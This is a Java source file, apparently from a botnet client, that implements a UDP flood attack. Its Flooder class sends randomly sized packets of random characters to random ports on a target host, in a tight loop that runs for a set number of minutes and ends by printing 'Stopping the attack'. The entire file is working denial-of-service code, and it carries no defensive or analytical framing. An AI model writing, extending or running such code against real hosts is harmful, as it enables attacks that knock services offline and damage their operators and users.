package com.example.botclient.udpflood;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;


public class Flooder implements Runnable
{
    private DatagramSocket sock;
    private boolean stop;
    private InetAddress host;
    private Thread t;
    private int attackMinutes;
    private boolean completedOk = false;


    public Flooder(String host, int attackMinutes) throws java.net.UnknownHostException, java.net.SocketException
    {
        t = new Thread(this);
        this.host = InetAddress.getByName(host);
        this.attackMinutes = attackMinutes;
        sock = new DatagramSocket();
        stop = false;
    }

    public void send(String data, int port)
    {
        byte[] byte_data = data.getBytes();
        DatagramPacket sendPacket = new DatagramPacket(byte_data, byte_data.length, host, port);
        try {sock.send(sendPacket);} catch (Exception e){}
    }

    public void stop()
    {
        stop = true;
        sock.close();
        new UdpFlood().stop();
    }

    public void start()
    {
        t.start();
    }

    public void run()
    {
        final long NANOSEC_PER_SEC = 1000l*1000*1000;
        long startTime = System.nanoTime();

        while ( ((System.nanoTime()-startTime)< attackMinutes*60*NANOSEC_PER_SEC))
        {
             String randData = randString(randInt(32, 1024));
             int port = randInt(1, 65535);
             System.out.println("Sending udp packet to port "+port);
             send(randData, port);
        }
        System.out.println("Stopping the attack.....");
        stop();
    }

    public static int randInt(int min, int max)
    {
        return (min + (int)(Math.random()*(max-min)));
    }

    public static String randString(int length)
    {
        String randstr="";

        for (int i=0; i<=length; i++)
        {
            int charset = 1 + (int)(Math.random()*3);

            if (charset==1)
            {
                char randChar = (char) (48 + (int)(Math.random()*(57-48)));
                randstr += randChar;
            }
            else if (charset==2)
            {
                char randChar = (char) (65 + (int)(Math.random()*(90-65)));
                randstr += randChar;
            }
            else if (charset==3)
            {
                char randChar = (char) (97 + (int)(Math.random()*(122-97)));
                randstr += randChar;
            }
        }
        return randstr;
    }
}


